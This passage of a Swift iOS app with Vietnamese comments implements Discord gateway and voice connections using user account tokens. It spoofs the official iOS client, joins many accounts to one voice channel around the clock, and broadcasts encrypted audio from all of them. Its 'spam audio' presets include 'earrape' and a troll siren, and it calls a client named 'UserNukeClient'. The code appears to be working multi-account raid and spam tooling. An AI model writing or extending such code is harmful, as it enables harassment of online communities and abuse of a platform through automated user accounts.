        packet[7] = UInt8(ssrc & 0xFF)

        var tv = timeval(tv_sec: 1, tv_usec: 0)
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, socklen_t(MemoryLayout<timeval>.size))

        for _ in 0..<3 {
            let sent = withUnsafePointer(to: &addr) { ptr -> Int in
                ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    packet.withUnsafeBufferPointer { buf in
                        Darwin.sendto(sockfd, buf.baseAddress, 74, 0, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                    }
                }
            }
            guard sent == 74 else { continue }

            var response = [UInt8](repeating: 0, count: 74)
            var fromAddr = sockaddr_in()
            var fromLen = socklen_t(MemoryLayout<sockaddr_in>.size)

            let recvd = withUnsafeMutablePointer(to: &fromAddr) { ptr -> Int in
                ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    response.withUnsafeMutableBufferPointer { buf in
                        Darwin.recvfrom(sockfd, buf.baseAddress, 74, 0, sa, &fromLen)
                    }
                }
            }
            if recvd >= 74 {
                var ipBytes = [UInt8]()
                for i in 8..<72 {
                    if response[i] == 0 { break }
                    ipBytes.append(response[i])
                }
                if let myIP = String(bytes: ipBytes, encoding: .utf8), !myIP.isEmpty {
                    let myPort = (UInt16(response[72]) << 8) | UInt16(response[73])
                    return (myIP, myPort)
                }
            }
        }
        return nil
    }

    func sendPacket(_ data: Data) {
        guard sockfd >= 0, var addr = serverAddr else { return }
        _ = withUnsafePointer(to: &addr) { ptr -> Int in
            ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                data.withUnsafeBytes { raw in
                    Darwin.sendto(sockfd, raw.baseAddress, data.count, 0, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                }
            }
        }
    }

    func close() {
        if sockfd >= 0 {
            Darwin.close(sockfd)
            sockfd = -1
        }
        isConnected = false
    }

    deinit {
        close()
    }
}

// MARK: - NATIVE OPUS AUDIO ENCODER (AVFOUNDATION & COREAUDIO)
final class NativeOpusEncoder {
    private var converter: AVAudioConverter?
    private let inputFormat: AVAudioFormat
    private let outputFormat: AVAudioFormat

    init?() {
        // Định dạng PCM đầu vào: 48kHz Stereo Float32
        guard let inFmt = AVAudioFormat(
            commonFormat: .pcmFormatFloat32,
            sampleRate: 48000.0,
            channels: 2,
            interleaved: false
        ) else { return nil }
        self.inputFormat = inFmt

        var opusDesc = AudioStreamBasicDescription(
            mSampleRate: 48000.0,
            mFormatID: kAudioFormatOpus,
            mFormatFlags: 0,
            mBytesPerPacket: 0,
            mFramesPerPacket: 960, // 20ms ở 48000Hz = 960 samples
            mBytesPerFrame: 0,
            mChannelsPerFrame: 2,
            mBitsPerChannel: 0,
            mReserved: 0
        )

        guard let outFmt = AVAudioFormat(streamDescription: &opusDesc) else {
            return nil
        }
        self.outputFormat = outFmt

        guard let conv = AVAudioConverter(from: inFmt, to: outFmt) else {
            return nil
        }
        conv.bitRate = 64000
        self.converter = conv
    }

    /// Mã hóa 960 frame Float32 Stereo (20ms) thành 1 gói tin Opus chuẩn RFC 6716
    func encode(leftChannel: [Float], rightChannel: [Float]) -> Data? {
        guard let converter = converter else { return nil }
        guard leftChannel.count >= 960, rightChannel.count >= 960 else { return nil }

        guard let pcmBuf = AVAudioPCMBuffer(pcmFormat: inputFormat, frameCapacity: 960) else { return nil }
        pcmBuf.frameLength = 960

        if let chData = pcmBuf.floatChannelData {
            leftChannel.withUnsafeBufferPointer { ptr in
                chData[0].initialize(from: ptr.baseAddress!, count: 960)
            }
            rightChannel.withUnsafeBufferPointer { ptr in
                chData[1].initialize(from: ptr.baseAddress!, count: 960)
            }
        }

        let compBuf = AVAudioCompressedBuffer(
            format: outputFormat,
            packetCapacity: 1,
            maximumPacketSize: 1275
        )

        var error: NSError?
        var hasSupplied = false

        let status = converter.convert(to: compBuf, error: &error) { _, outStatus in
            if hasSupplied {
                outStatus.pointee = .noDataNow
                return nil
            }
            hasSupplied = true
            outStatus.pointee = .haveData
            return pcmBuf
        }

        if (status == .haveData || status == .inputRanDry || compBuf.byteLength > 0) && compBuf.byteLength > 0 {
            return Data(bytes: compBuf.data, count: Int(compBuf.byteLength))
        }
        return nil
    }
}

// MARK: - AUDIO TRACK DECODER (Giải mã mp3, wav, m4a, flac sang 48kHz Float32 Stereo)
final class AudioTrackDecoder {
    var leftSamples: [Float] = []
    var rightSamples: [Float] = []
    var durationSeconds: Double = 0
    var totalFrames: Int {
        return leftSamples.count / 960
    }

    init?(url: URL) {
        guard let audioFile = try? AVAudioFile(forReading: url) else { return nil }
        let processingFormat = audioFile.processingFormat
        let fileLength = audioFile.length
        durationSeconds = Double(fileLength) / processingFormat.sampleRate

        guard let targetFormat = AVAudioFormat(
            commonFormat: .pcmFormatFloat32,
            sampleRate: 48000.0,
            channels: 2,
            interleaved: false
        ) else { return nil }

        guard let converter = AVAudioConverter(from: processingFormat, to: targetFormat) else { return nil }

        let readCapacity: AVAudioFrameCount = 4096
        guard let inputBuffer = AVAudioPCMBuffer(pcmFormat: processingFormat, frameCapacity: readCapacity),
              let outputBuffer = AVAudioPCMBuffer(pcmFormat: targetFormat, frameCapacity: readCapacity) else { return nil }

        audioFile.framePosition = 0
        var allL: [Float] = []
        var allR: [Float] = []
        allL.reserveCapacity(Int(fileLength))
        allR.reserveCapacity(Int(fileLength))

        while audioFile.framePosition < fileLength {
            do {
                try audioFile.read(into: inputBuffer)
                if inputBuffer.frameLength == 0 { break }

                var isDone = false
                var error: NSError?
                let inputBlock: AVAudioConverterInputBlock = { _, outStatus in
                    if isDone {
                        outStatus.pointee = .noDataNow
                        return nil
                    }
                    isDone = true
                    outStatus.pointee = .haveData
                    return inputBuffer
                }

                outputBuffer.frameLength = 0
                converter.convert(to: outputBuffer, error: &error, withInputFrom: inputBlock)
                if error != nil { break }

                let count = Int(outputBuffer.frameLength)
                if count > 0, let ch = outputBuffer.floatChannelData {
                    allL.append(contentsOf: UnsafeBufferPointer(start: ch[0], count: count))
                    allR.append(contentsOf: UnsafeBufferPointer(start: ch[1], count: count))
                }
            } catch {
                break
            }
        }

        guard !allL.isEmpty else { return nil }
        self.leftSamples = allL
        self.rightSamples = allR
        self.durationSeconds = Double(allL.count) / 48000.0
    }

    init(left: [Float], right: [Float], durationSeconds: Double) {
        self.leftSamples = left
        self.rightSamples = right
        self.durationSeconds = durationSeconds
    }
}

// MARK: - SPAM AUDIO MODES & PRESETS
enum SpamAudioFX: String, CaseIterable, Identifiable {
    case normal = "Bình Thường"
    case bassBoost = "Bass Boosted"
    case nightcore = "Nightcore (1.25x)"
    case slowed = "Slowed Reverb (0.85x)"
    case earrape = "Earrape Cực Đại"

    var id: String { rawValue }

    var icon: String {
        switch self {
        case .normal: return "music.note"
        case .bassBoost: return "speaker.wave.3.fill"
        case .nightcore: return "hare.fill"
        case .slowed: return "tortoise.fill"
        case .earrape: return "flame.fill"
        }
    }
}

enum MusicPreset: String, CaseIterable, Identifiable {
    case djVinahouse = "DJ Vinahouse Remix"
    case bassBoost = "Bass Boosted Trap"
    case loFi = "Lo-Fi Beats Chill"
    case trollSiren = "Còi Báo Động Troll"
    case whiteNoise = "Âm Thanh Ảo / Noise"

    var id: String { rawValue }

    var icon: String {
        switch self {
        case .djVinahouse: return "bolt.fill"
        case .bassBoost: return "speaker.wave.3.fill"
        case .loFi: return "headphones"
        case .trollSiren: return "exclamationmark.triangle.fill"
        case .whiteNoise: return "waveform"
        }
    }

    var color: Color {
        switch self {
        case .djVinahouse: return .purple
        case .bassBoost: return .red
        case .loFi: return .blue
        case .trollSiren: return .orange
        case .whiteNoise: return .teal
        }
    }
}

// MARK: - PLAYLIST ITEM & LOOP MODE
struct PlaylistItem: Identifiable, Equatable {
    let id: UUID
    var title: String
    var url: URL?
    var durationSeconds: Double
    var isPreset: Bool
    var preset: MusicPreset?

    var durationFormatted: String {
        guard durationSeconds > 0 else { return "--:--" }
        let s = Int(durationSeconds)
        return String(format: "%02d:%02d", s / 60, s % 60)
    }

    static func == (lhs: PlaylistItem, rhs: PlaylistItem) -> Bool {
        lhs.id == rhs.id
    }
}

enum PlaylistLoopMode: String, CaseIterable, Identifiable {
    case loopAll = "Lặp Danh Sách"
    case loopOne = "Lặp 1 Bài"
    case shuffle = "Ngẫu Nhiên"

    var id: String { rawValue }

    var icon: String {
        switch self {
        case .loopAll: return "repeat"
        case .loopOne: return "repeat.1"
        case .shuffle: return "shuffle"
        }
    }
}

// MARK: - VOICE GATEWAY SESSION (DISCORD GATEWAY + VOICE WEBSOCKET + UDP RTP)
final class VoiceGatewaySession: Identifiable, ObservableObject {
    let id: UUID
    let token: String
    var userId: String
    let username: String
    let avatarURL: URL?

    @Published var isConnected = false
    @Published var isJoined = false
    @Published var isSpeaking = false
    @Published var isVoiceUDPReady = false
    @Published var pingMs: Int = 0
    @Published var lastLog = ""

    private var wsTask: URLSessionWebSocketTask?
    private var voiceWsTask: URLSessionWebSocketTask?
    private var gatewaySession: URLSession?
    private var voiceGatewaySession: URLSession?
    private var heartbeatTask: Task<Void, Never>?
    private var voiceHeartbeatTask: Task<Void, Never>?
    private var listenTask: Task<Void, Never>?
    private var voiceListenTask: Task<Void, Never>?

    private var currentGuildId: String?
    private var currentChannelId: String?
    private var selfMute = false
    private var selfDeaf = false
    private var selfVideo = false

    private var sessionId: String?
    private var voiceToken: String?
    private var voiceEndpoint: String?
    private var ssrc: Int = 0
    private var secretKey: Data?

    private let udpClient = DiscordVoiceUDPClient()
    private var rtpSequence: UInt16 = UInt16.random(in: 0...65535)
    private var rtpTimestamp: UInt32 = UInt32.random(in: 0...4000000)
    private var rtpNonceCounter: UInt32 = 0

    var onLog: ((String) -> Void)?

    init(tokenInfo: TokenInfo) {
        self.id = tokenInfo.id
        self.token = tokenInfo.token
        self.userId = tokenInfo.userId
        self.username = tokenInfo.username
        self.avatarURL = tokenInfo.avatarURL
    }

    func start(guildId: String, channelId: String, mute: Bool, deaf: Bool, video: Bool) {
        self.currentGuildId = guildId
        self.currentChannelId = channelId
        self.selfMute = mute
        self.selfDeaf = deaf
        self.selfVideo = video

        connectGateway()
    }

    private func log(_ msg: String) {
        let full = "[\(username)] \(msg)"
        DispatchQueue.main.async { [weak self] in
            self?.lastLog = msg
            self?.onLog?(full)
        }
    }

    private func connectGateway() {
        guard let url = URL(string: AppEndpoints.gatewayURL) else {
            log("Gateway URL không hợp lệ")
            return
        }

        wsTask?.cancel(with: .goingAway, reason: nil)
        listenTask?.cancel()
        heartbeatTask?.cancel()
        gatewaySession?.invalidateAndCancel()

        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 20
        config.timeoutIntervalForResource = 30
        let session = URLSession(configuration: config)
        self.gatewaySession = session

        let ws = session.webSocketTask(with: url)
        // Cố định buffer để tránh lỗi "Message too long" khi tài khoản có nhiều server
        ws.maximumMessageSize = 64 * 1024 * 1024
        self.wsTask = ws
        ws.resume()

        listenTask = Task { [weak self] in
            guard let self = self else { return }
            do {
                while !Task.isCancelled {
                    let message = try await ws.receive()
                    switch message {
                    case .string(let text):
                        await self.handleGatewayMessage(text)
                    case .data(let data):
                        if let text = String(data: data, encoding: .utf8) {
                            await self.handleGatewayMessage(text)
                        }
                    @unknown default:
                        break
                    }
                }
            } catch {
                if !Task.isCancelled {
                    self.log("Gateway ngắt kết nối: \(error.localizedDescription)")
                    DispatchQueue.main.async {
                        self.isConnected = false
                        self.isJoined = false
                        self.isVoiceUDPReady = false
                    }
                }
            }
        }
    }

    private func handleGatewayMessage(_ text: String) async {
        guard let data = text.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let op = json["op"] as? Int else { return }

        switch op {
        case 10: // Hello
            if let d = json["d"] as? [String: Any],
               let interval = d["heartbeat_interval"] as? Int {
                startHeartbeat(intervalMs: interval)
                sendIdentify()
            }
        case 11: // Heartbeat ACK
            break
        case 0: // Dispatch
            let event = json["t"] as? String
            if event == "READY" {
                if let d = json["d"] as? [String: Any], let user = d["user"] as? [String: Any], let uid = user["id"] as? String, self.userId.isEmpty {
                    self.userId = uid
                }
                DispatchQueue.main.async { self.isConnected = true }
                log("Đã kết nối Gateway! Đang vào Voice Channel...")
                sendVoiceStateUpdate()
            } else if event == "VOICE_STATE_UPDATE" {
                if let d = json["d"] as? [String: Any],
                   let uid = d["user_id"] as? String {
                    if self.userId.isEmpty { self.userId = uid }
                    if uid == self.userId {
                    if let sid = d["session_id"] as? String {
                        self.sessionId = sid
                    }
                    if let cid = d["channel_id"] as? String, cid == currentChannelId {
                        DispatchQueue.main.async { self.isJoined = true }
                        log("Đã vào phòng Voice! Đang kết nối máy chủ âm thanh...")
                        tryConnectVoiceGateway()
                    } else if d["channel_id"] == nil || d["channel_id"] is NSNull {
                        DispatchQueue.main.async {
                            self.isJoined = false
                            self.isVoiceUDPReady = false
                        }
                    }
                    }
                }
            } else if event == "VOICE_SERVER_UPDATE" {
                if let d = json["d"] as? [String: Any],
                   let token = d["token"] as? String,
                   let endpoint = d["endpoint"] as? String {
                    self.voiceToken = token
                    self.voiceEndpoint = endpoint
                    log("Đã nhận Voice Server: \(endpoint)")
                    tryConnectVoiceGateway()
                }
            }
        default:
            break
        }
    }

    private func startHeartbeat(intervalMs: Int) {
        heartbeatTask?.cancel()
        let intervalSec = Double(intervalMs) / 1000.0
        heartbeatTask = Task { [weak self] in
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(intervalSec * 1_000_000_000))
                guard let self = self, let ws = self.wsTask else { break }
                let start = Date()
                let hb = "{\"op\":1,\"d\":null}"
                try? await ws.send(.string(hb))
                let ping = Int(Date().timeIntervalSince(start) * 1000)
                DispatchQueue.main.async {
                    self.pingMs = max(15, ping)
                }
            }
        }
    }

    private func sendIdentify() {
        guard let ws = wsTask else { return }
        let payload: [String: Any] = [
            "op": 2,
            "d": [
                "token": token,
                "capabilities": 125,
                "properties": [
                    "os": "iOS",
                    "browser": "Discord iOS",
                    "device": "iPhone"
                ],
                "compress": false,
                "presence": [
                    "status": "online",
                    "since": 0,
                    "activities": [],
                    "afk": false
                ]
            ]
        ]
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            Task { try? await ws.send(.string(str)) }
        }
    }

    func sendVoiceStateUpdate() {
        guard let ws = wsTask, let gid = currentGuildId else { return }
        let cid: Any = currentChannelId ?? NSNull()
        let payload: [String: Any] = [
            "op": 4,
            "d": [
                "guild_id": gid,
                "channel_id": cid,
                "self_mute": selfMute,
                "self_deaf": selfDeaf,
                "self_video": selfVideo
            ]
        ]
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            Task { try? await ws.send(.string(str)) }
        }
    }

    func updateToggles(mute: Bool, deaf: Bool, video: Bool) {
        self.selfMute = mute
        self.selfDeaf = deaf
        self.selfVideo = video
        sendVoiceStateUpdate()
    }

    private func tryConnectVoiceGateway() {
        guard let sid = sessionId, let vtok = voiceToken, let ep = voiceEndpoint, let gid = currentGuildId else { return }
        let cleanHost = cleanVoiceEndpoint(ep)
        guard !cleanHost.isEmpty, let vUrl = URL(string: "wss://\(cleanHost)/?v=8") else {
            log("Lỗi: Voice Endpoint không hợp lệ (\(ep))")
            return
        }

        voiceWsTask?.cancel(with: .goingAway, reason: nil)
        voiceListenTask?.cancel()
        voiceHeartbeatTask?.cancel()
        voiceGatewaySession?.invalidateAndCancel()

        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 15
        config.timeoutIntervalForResource = 30
        let session = URLSession(configuration: config)
        self.voiceGatewaySession = session

        let vWs = session.webSocketTask(with: vUrl)
        vWs.maximumMessageSize = 32 * 1024 * 1024
        self.voiceWsTask = vWs
        vWs.resume()
        log("Đang bắt tay Voice Gateway: \(vUrl.absoluteString)...")

        voiceListenTask = Task { [weak self] in
            guard let self = self else { return }
            do {
                while !Task.isCancelled {
                    let msg = try await vWs.receive()
                    switch msg {
                    case .string(let s):
                        await self.handleVoiceMessage(s, guildId: gid, sessionId: sid, voiceToken: vtok)
                    case .data(let d):
                        if let s = String(data: d, encoding: .utf8) {
                            await self.handleVoiceMessage(s, guildId: gid, sessionId: sid, voiceToken: vtok)
                        }
                    @unknown default:
                        break
                    }
                }
            } catch {
                if !Task.isCancelled {
                    self.log("Voice Gateway WS ngắt: \(error.localizedDescription)")
                }
            }
        }
    }

    private func handleVoiceMessage(_ text: String, guildId: String, sessionId: String, voiceToken: String) async {
        guard let data = text.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let op = json["op"] as? Int else { return }

        switch op {
        case 8: // Hello
            if let d = json["d"] as? [String: Any] {
                let interval: Double = (d["heartbeat_interval"] as? Double)
                    ?? (d["heartbeat_interval"] as? Int).map { Double($0) }
                    ?? ((d["heartbeat_interval"] as? NSNumber)?.doubleValue)
                    ?? 41250.0
                startVoiceHeartbeat(intervalMs: interval)
                log("Nhận Voice Hello (HB: \(Int(interval))ms). Đang gửi Identify...")
                sendVoiceIdentify(guildId: guildId, sessionId: sessionId, token: voiceToken)
            }
        case 2: // Ready
            if let d = json["d"] as? [String: Any] {
                if let ssrcVal = d["ssrc"] as? Int {
                    self.ssrc = ssrcVal
                }
                let ip = d["ip"] as? String ?? ""
                let port = d["port"] as? Int ?? 0
                log("Voice Ready! SSRC: \(self.ssrc), UDP Server: \(ip):\(port). Đang bắt tay UDP...")
                startVoiceUDP(ip: ip, port: port)
            }
        case 4: // Session Description
            if let d = json["d"] as? [String: Any] {
                let mode = d["mode"] as? String ?? ""
                if let keyArr = d["secret_key"] as? [Int] {
                    self.secretKey = Data(keyArr.map { UInt8($0 & 0xFF) })
                } else if let keyArr = d["secret_key"] as? [UInt8] {
                    self.secretKey = Data(keyArr)
                }
                DispatchQueue.main.async {
                    self.isVoiceUDPReady = true
                    self.isJoined = true
                }
                log("Kênh thoại đã sẵn sàng xả nhạc (\(mode))!")
                if self.isSpeaking {
                    sendSpeaking(true)
                }
            }
        case 6: // Heartbeat ACK
            break
        case 9: // Resumed
            log("Voice Gateway đã hồi phục phiên (Resumed).")
        default:
            break
        }
    }

    private func fetchPublicIP() async -> String? {
        guard let url = URL(string: "https://api.ipify.org") else { return nil }
        var req = URLRequest(url: url)
        req.timeoutInterval = 3
        if let (data, _) = try? await URLSession.shared.data(for: req),
           let ip = String(data: data, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines),
           !ip.isEmpty {
            return ip
        }
        return nil
    }

    private func startVoiceUDP(ip: String, port: Int) {
        log("Đang mở socket UDP tới \(ip):\(port)...")
        guard udpClient.connect(ip: ip, port: UInt16(port)) else {
            log("Lỗi khởi tạo UDP socket")
            return
        }

        Task.detached { [weak self] in
            guard let self = self else { return }
            var extIP = ""
            var extPort = port

            if let disc = self.udpClient.discoverIP(ssrc: UInt32(self.ssrc)) {
                extIP = disc.ip
                extPort = Int(disc.port)
                self.log("Phát hiện UDP IP ngoại vi: \(extIP):\(extPort)")
            } else {
                if let pub = await self.fetchPublicIP() {
                    extIP = pub
                    self.log("Dùng Public IPv4 fallback: \(extIP):\(extPort)")
                } else if let resolved = resolveHostToIPv4(ip) {
                    extIP = resolved
                    self.log("Dùng Host IP trực tiếp: \(extIP):\(extPort)")
                } else {
                    extIP = ip
                }
            }

            self.log("Gửi Select Protocol tới Voice Gateway...")
            self.sendSelectProtocol(ip: extIP, port: extPort)
        }
    }

    private func sendSelectProtocol(ip: String, port: Int) {
        guard let ws = voiceWsTask else { return }
        let payload: [String: Any] = [
            "op": 1,
            "d": [
                "protocol": "udp",
                "data": [
                    "address": ip,
                    "port": port,
                    "mode": "aead_aes256_gcm_rtpsize"
                ]
            ]
        ]
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            Task { try? await ws.send(.string(str)) }
        }
    }

    private func startVoiceHeartbeat(intervalMs: Double) {
        voiceHeartbeatTask?.cancel()
        let intervalSec = intervalMs / 1000.0
        voiceHeartbeatTask = Task { [weak self] in
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(intervalSec * 1_000_000_000))
                guard let self = self, let ws = self.voiceWsTask else { break }
                let nonce = Int.random(in: 1000...999999)
                let hb = "{\"op\":3,\"d\":\(nonce)}"
                try? await ws.send(.string(hb))
            }
        }
    }

    private func sendVoiceIdentify(guildId: String, sessionId: String, token: String) {
        guard let ws = voiceWsTask else { return }
        let payload: [String: Any] = [
            "op": 0,
            "d": [
                "server_id": guildId,
                "user_id": userId,
                "session_id": sessionId,
                "token": token
            ]
        ]
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            Task { try? await ws.send(.string(str)) }
        }
    }

    func setSpeaking(_ speaking: Bool) {
        self.isSpeaking = speaking
        sendSpeaking(speaking)
    }

    private func sendSpeaking(_ speaking: Bool) {
        guard let ws = voiceWsTask else { return }
        let payload: [String: Any] = [
            "op": 5,
            "d": [
                "speaking": speaking ? 1 : 0,
                "delay": 0,
                "ssrc": ssrc
            ]
        ]
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            Task { try? await ws.send(.string(str)) }
        }
    }

    /// Truyền gói tin âm thanh Opus trực tiếp vào kênh thoại qua UDP RTP (aead_aes256_gcm_rtpsize)
    func sendOpusPacket(_ opusPayload: Data) {
        guard isVoiceUDPReady, let key = secretKey, key.count == 32 else { return }

        // 12-byte RTP Header
        var header = [UInt8](repeating: 0, count: 12)
        header[0] = 0x80
        header[1] = 0x78 // Payload type 120 (Opus)
        header[2] = UInt8((rtpSequence >> 8) & 0xFF)
        header[3] = UInt8(rtpSequence & 0xFF)
        header[4] = UInt8((rtpTimestamp >> 24) & 0xFF)
        header[5] = UInt8((rtpTimestamp >> 16) & 0xFF)
        header[6] = UInt8((rtpTimestamp >> 8) & 0xFF)
        header[7] = UInt8(rtpTimestamp & 0xFF)
        header[8] = UInt8((ssrc >> 24) & 0xFF)
        header[9] = UInt8((ssrc >> 16) & 0xFF)
        header[10] = UInt8((ssrc >> 8) & 0xFF)
        header[11] = UInt8(ssrc & 0xFF)

        // aead_aes256_gcm_rtpsize: 4-byte counter + 8 bytes zero = 12 bytes nonce
        var nonceBytes = [UInt8](repeating: 0, count: 12)
        nonceBytes[0] = UInt8((rtpNonceCounter >> 24) & 0xFF)
        nonceBytes[1] = UInt8((rtpNonceCounter >> 16) & 0xFF)
        nonceBytes[2] = UInt8((rtpNonceCounter >> 8) & 0xFF)
        nonceBytes[3] = UInt8(rtpNonceCounter & 0xFF)

        do {
            let nonce = try AES.GCM.Nonce(data: nonceBytes)
            let symKey = SymmetricKey(data: key)
            let sealed = try AES.GCM.seal(opusPayload, using: symKey, nonce: nonce, authenticating: Data(header))

            // Packet = Header (12) + Ciphertext + Tag (16) + Nonce Suffix (4)
            var packet = Data(header)
            packet.append(sealed.ciphertext)
            packet.append(sealed.tag)
            packet.append(contentsOf: nonceBytes[0..<4])

            udpClient.sendPacket(packet)

            rtpSequence = rtpSequence &+ 1
            rtpTimestamp = rtpTimestamp &+ 960
            rtpNonceCounter = rtpNonceCounter &+ 1
        } catch {
            // Error
        }
    }

    func stop() {
        if let gid = currentGuildId {
            let payload: [String: Any] = [
                "op": 4,
                "d": [
                    "guild_id": gid,
                    "channel_id": NSNull(),
                    "self_mute": false,
                    "self_deaf": false,
                    "self_video": false
                ]
            ]
            if let data = try? JSONSerialization.data(withJSONObject: payload),
               let str = String(data: data, encoding: .utf8),
               let ws = wsTask {
                Task { try? await ws.send(.string(str)) }
            }
        }

        heartbeatTask?.cancel(); heartbeatTask = nil
        listenTask?.cancel(); listenTask = nil
        wsTask?.cancel(with: .goingAway, reason: nil); wsTask = nil
        gatewaySession?.invalidateAndCancel(); gatewaySession = nil

        voiceHeartbeatTask?.cancel(); voiceHeartbeatTask = nil
        voiceListenTask?.cancel(); voiceListenTask = nil
        voiceWsTask?.cancel(with: .goingAway, reason: nil); voiceWsTask = nil
        voiceGatewaySession?.invalidateAndCancel(); voiceGatewaySession = nil
        udpClient.close()

        DispatchQueue.main.async {
            self.isConnected = false
            self.isJoined = false
            self.isSpeaking = false
            self.isVoiceUDPReady = false
        }
        log("Đã ngắt kết nối.")
    }
}

// MARK: - LOG ENTRY
typealias VoiceRoomLog = VoiceLogEntry
struct VoiceLogEntry: Identifiable {
    var id: UUID = UUID()
    let timestamp: Date
    let message: String

    init(id: UUID = UUID(), timestamp: Date, message: String) {
        self.id = id
        self.timestamp = timestamp
        self.message = message
    }
}

// ==============================================================================
// MARK: - VOICE ROOM MANAGER (TREO ROOM 24/7)
// ==============================================================================
@MainActor
final class VoiceRoomManager: ObservableObject {
    static let shared = VoiceRoomManager()

    @Published var isRunning = false
    @Published var targetChannelId = ""
    @Published var selectedGuild: Guild? = nil
    @Published var selectedChannel: Channel? = nil
    @Published var voiceChannels: [Channel] = []
    @Published var isLoadingChannels = false

    @Published var multiTokenMode = true
    @Published var selfMute = false
    @Published var selfDeaf = false
    @Published var selfVideo = false

    @Published var sessions: [VoiceGatewaySession] = []
    @Published var elapsedSeconds: Int = 0
    @Published var logs: [VoiceLogEntry] = []

    private var timer: Timer?

    private init() {}

    func loadVoiceChannels(guild: Guild, token: String) async {
        selectedGuild = guild
        selectedChannel = nil
        isLoadingChannels = true
        voiceChannels = []
        do {
            let all = try await UserNukeClient(token: token).getChannels(guild.id)
            let vcs = all.filter { $0.type == 2 || $0.type == 13 }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
            self.voiceChannels = vcs
            if let first = vcs.first {
                self.selectedChannel = first
                self.targetChannelId = first.id
            }
        } catch {
            addLog("Lỗi lấy danh sách Voice: \(error.localizedDescription)")
        }
        isLoadingChannels = false
    }

    func startTreo(guildId: String, channelId: String, channelName: String, tokens: [TokenInfo]) {
        guard !tokens.isEmpty else {
            addLog("Không có token nào được chọn")
            return
        }

        stopTreo()

        isRunning = true
        elapsedSeconds = 0
        logs = []

        addLog("Bắt đầu treo room [\(channelName)] (\(tokens.count) tài khoản)")

        BackgroundManager.shared.start()
        NowPlayingHelper.shared.update(
            title: "Treo Voice: \(channelName)",
            detail: "\(tokens.count) tài khoản đang online"
        )

        var newSessions = [VoiceGatewaySession]()
        for t in tokens {
            let session = VoiceGatewaySession(tokenInfo: t)
            session.onLog = { [weak self] msg in
                self?.addLog(msg)
            }
            session.start(
                guildId: guildId,
                channelId: channelId,
                mute: selfMute,
                deaf: selfDeaf,
                video: selfVideo
            )
            newSessions.append(session)
        }
        self.sessions = newSessions

        timer?.invalidate()
        timer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] _ in
            Task { @MainActor [weak self] in
                guard let self = self, self.isRunning else { return }
                self.elapsedSeconds += 1
                if self.elapsedSeconds % 10 == 0 {
                    let joinedCount = self.sessions.filter { $0.isJoined }.count
                    NowPlayingHelper.shared.update(
                        title: "Treo Voice: \(channelName)",
                        detail: "\(joinedCount)/\(tokens.count) token | \(self.formatDuration(self.elapsedSeconds))"
                    )
                }
            }
        }
    }

    func stopTreo() {
        timer?.invalidate()
        timer = nil

        for s in sessions {
            s.stop()
        }
        sessions.removeAll()
        isRunning = false
        addLog("Đã dừng treo room.")
    }

    func updateToggles(mute: Bool, deaf: Bool, video: Bool) {
        self.selfMute = mute
        self.selfDeaf = deaf
        self.selfVideo = video
        for s in sessions {
            s.updateToggles(mute: mute, deaf: deaf, video: video)
        }
    }

    func setSpeaking(_ speaking: Bool) {
        for s in sessions {
            s.setSpeaking(speaking)
        }
    }

    func broadcastOpusPacket(_ opusData: Data) {
        for s in sessions {
            s.sendOpusPacket(opusData)
        }
    }

    func addLog(_ msg: String) {
        let entry = VoiceLogEntry(timestamp: Date(), message: msg)
        logs.insert(entry, at: 0)
        if logs.count > 100 { logs.removeLast() }
    }

    func formatDuration(_ s: Int) -> String {
        let h = s / 3600
        let m = (s % 3600) / 60
        let sec = s % 60
        if h > 0 {
            return String(format: "%02d:%02d:%02d", h, m, sec)
        }
        return String(format: "%02d:%02d", m, sec)
    }
}

// ==============================================================================
// MARK: - MUSIC STREAM MANAGER (HỆ THỐNG TIÊN NGHỊCH [XẢ CHA - ĐỘC TÔN] - MAKE SUPER VIP)
// ==============================================================================
@MainActor
final class MusicStreamManager: NSObject, ObservableObject, AVAudioPlayerDelegate {
    static let shared = MusicStreamManager()

    @Published var isPlaying = false
    @Published var isPaused = false
    @Published var statusText = "⛩️ Bế quan (Chưa hoạt động)"
    @Published var logs: [VoiceRoomLog] = []

    // Trận pháp Đạo Hữu (Đa Token / 1 Token)
    @Published var multiTokenMode: Bool = true // Mặc định chạy cả dàn token như Make Super VIP
    @Published var selectedToken: TokenInfo? = nil
    @Published var customToken: String = ""
    @Published var targetChannelId: String = ""
    @Published var selectedGuild: Guild? = nil
    @Published var selectedChannel: Channel? = nil

    // Linh Hồn Hàng Đợi (Playlist Queue)
    @Published var playlist: [PlaylistItem] = []
    @Published var currentTrackIndex: Int = 0
    @Published var currentSongTitle = "Chưa nạp pháp bảo nhạc"
    @Published var audioFileURL: URL? = nil
    @Published var currentTime: Double = 0
    @Published var duration: Double = 0
    @Published var visualizerLevels: [CGFloat] = [0.2, 0.4, 0.7, 0.3, 0.9, 0.5, 0.8, 0.4]

    // Cấu hình âm thanh & Sát chiêu chiến đấu Make Super VIP
    @Published var volume: Float = 1.0 { // Chân hỏa: 0.0 to 2.0 (0% - 200%)
        didSet { localPlayer?.volume = min(1.0, volume) }
    }
    @Published var boostMultiplier: Float = 1.0 // Ép xung: 1.0 to 5.0 (100% - 500%)
